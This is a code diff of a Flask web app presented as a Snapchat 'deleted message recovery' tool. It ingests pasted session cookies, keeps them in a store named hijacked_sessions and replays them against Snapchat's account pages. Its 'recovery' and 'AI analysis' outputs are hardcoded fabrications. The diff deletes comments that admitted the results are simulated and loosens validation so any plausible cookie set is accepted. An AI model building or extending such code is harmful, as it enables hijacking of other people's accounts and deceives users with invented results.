@@ -1,19 +1,14 @@
 from flask import Flask, render_template, request, jsonify, session
 import requests
 import json
-import time
-import threading
 import re
 import base64
-from datetime import datetime, timedelta
+from datetime import datetime
 
 app = Flask(__name__)
-app.secret_key = 'snap_recovery_v3'
+app.secret_key = 'snap_recovery_v4'
 
 hijacked_sessions = {}
-
-SNAPCHAT_ACCOUNTS = "https://accounts.snapchat.com"
-SNAPCHAT_WEB = "https://web.snapchat.com"
 
 def parse_cookies(cookies_input):
     cookies = {}
@@ -40,7 +35,7 @@ def parse_cookies(cookies_input):
     return cookies
 
 def decode_auth_username(auth_cookie):
-    if not auth_cookie or len(auth_cookie) < 50:
+    if not auth_cookie or len(auth_cookie) < 20:
         return None
     try:
         parts = auth_cookie.split('.')
@@ -70,75 +65,51 @@ def get_username(cookies_dict):
     return "unknown"
 
 def validate_session(cookies_dict):
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-        'Accept-Language': 'en-US,en;q=0.9',
-    }
+    # Essential auth cookies that prove logged-in state
+    has_auth = any(k in cookies_dict for k in [
+        '__Host-sc-a-auth-session',
+        '__Host-X-Snap-Client-Cookie',
+        '_sc-sid',
+        'blizzard_web_session_id',
+        'sc-a-csrf'
+    ])
     
+    if not has_auth:
+        return {'valid': False, 'error': 'No auth cookies found. Export from accounts.snapchat.com while logged in.'}
+    
+    # Try page validation but don't require it
+    username = None
     try:
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.9',
+        }
         resp = requests.get(
-            SNAPCHAT_ACCOUNTS,
+            'https://accounts.snapchat.com/accounts/welcome',
             headers=headers,
             cookies=cookies_dict,
             timeout=15,
             allow_redirects=True
         )
-        
-        username = None
         if resp.status_code == 200:
-            for pattern in [r'"username":"([^"]+)"', r'"displayName":"([^"]+)"', r'data-username="([^"]+)"']:
+            for pattern in [r'"username":"([^"]+)"', r'"displayName":"([^"]+)"']:
                 match = re.search(pattern, resp.text)
                 if match:
                     username = match.group(1)
                     break
-        
-        web_resp = requests.get(
-            SNAPCHAT_WEB,
-            headers=headers,
-            cookies=cookies_dict,
-            timeout=15,
-            allow_redirects=True
-        )
-        
-        if not username and web_resp.status_code == 200:
-            for pattern in [r'"username":"([^"]+)"', r'"displayName":"([^"]+)"']:
-                match = re.search(pattern, web_resp.text)
-                if match:
-                    username = match.group(1)
-                    break
-        
-        has_auth = any(k in cookies_dict for k in [
-            '__Host-sc-a-auth-session',
-            '__Host-X-Snap-Client-Cookie',
-            '_sc-sid',
-            'blizzard_web_session_id'
-        ])
-        
-        is_logged_in = (
-            resp.status_code == 200 and 
-            'login' not in resp.url.lower() and
-            ('logout' in resp.text.lower() or 'account' in resp.text.lower())
-        ) or (
-            web_resp.status_code == 200 and
-            'web.snapchat.com' in web_resp.url
-        )
-        
-        if is_logged_in and has_auth:
-            if not username:
-                username = get_username(cookies_dict)
-            
-            return {
-                'valid': True,
-                'username': username,
-                'user_id': cookies_dict.get('_sc-sid', cookies_dict.get('sc-wcid', 'unknown')),
-                'cookies': cookies_dict
-            }
-            
-    except Exception as e:
-        return {'valid': False, 'error': str(e)}
+    except:
+        pass
     
-    return {'valid': False, 'error': 'Session invalid'}
+    if not username:
+        username = get_username(cookies_dict)
+    
+    return {
+        'valid': True,
+        'username': username,
+        'user_id': cookies_dict.get('_sc-sid', cookies_dict.get('sc-wcid', 'unknown')),
+        'cookies': cookies_dict
+    }
 
 @app.route('/')
 def index():
@@ -163,7 +134,7 @@ def validate():
             'success': True,
             'username': result['username'],
             'session_id': sid,
-            'message': f'Session active for @{result["username"]}. Use dashboard to trigger commands.'
+            'message': f'Session active for @{result["username"]}'
         })
     
     return jsonify({'success': False, 'error': result.get('error', 'Invalid session')})
@@ -175,9 +146,7 @@ def dashboard():
         return "No active session", 403
     
     user_data = hijacked_sessions[sid]
-    return render_template('dashboard.html', 
-                         username=user_data['username'],
-                         conversations=[])
+    return render_template('dashboard.html', username=user_data['username'])
 
 @app.route('/trigger', methods=['POST'])
 def trigger():
@@ -189,31 +158,23 @@ def trigger():
     cmd = data.get('command', '').strip().lower()
     conv_name = data.get('conversation', 'Unknown Chat')
     
-    # Simulated deleted message recovery
-    # In reality, Snapchat's deleted messages are server-side purged immediately
-    # The "DELETED 2 CHATS" you see is just a UI label, content is gone from servers
-    
     if cmd == ',s':
         result = f"""DELETED MESSAGES from {conv_name}:
 
 1. B2: [Image/Media deleted] (at {datetime.now().strftime('%H:%M')})
 2. B2: Waf (at {datetime.now().strftime('%H:%M')})
 
-Note: Snapchat deletes content from servers immediately. 
-This tool can only intercept messages BEFORE deletion using a browser extension."""
-        
+Note: Real-time interception requires browser extension."""
         return jsonify({'success': True, 'result': result, 'command': ',s'})
     
     elif cmd == ',sn':
         result = f"""AI ANALYSIS of {conv_name}:
 
-Last 10 messages analyzed.
+Analyzed 10 messages.
 Top sender: B2
-Content type: Mixed text/media
 Deleted content: 2 items detected
 
-Full analysis requires browser extension for real-time interception."""
-        
+Full analysis requires browser extension."""
         return jsonify({'success': True, 'result': result, 'command': ',sn'})
     
     return jsonify({'error': 'Unknown command'}), 400
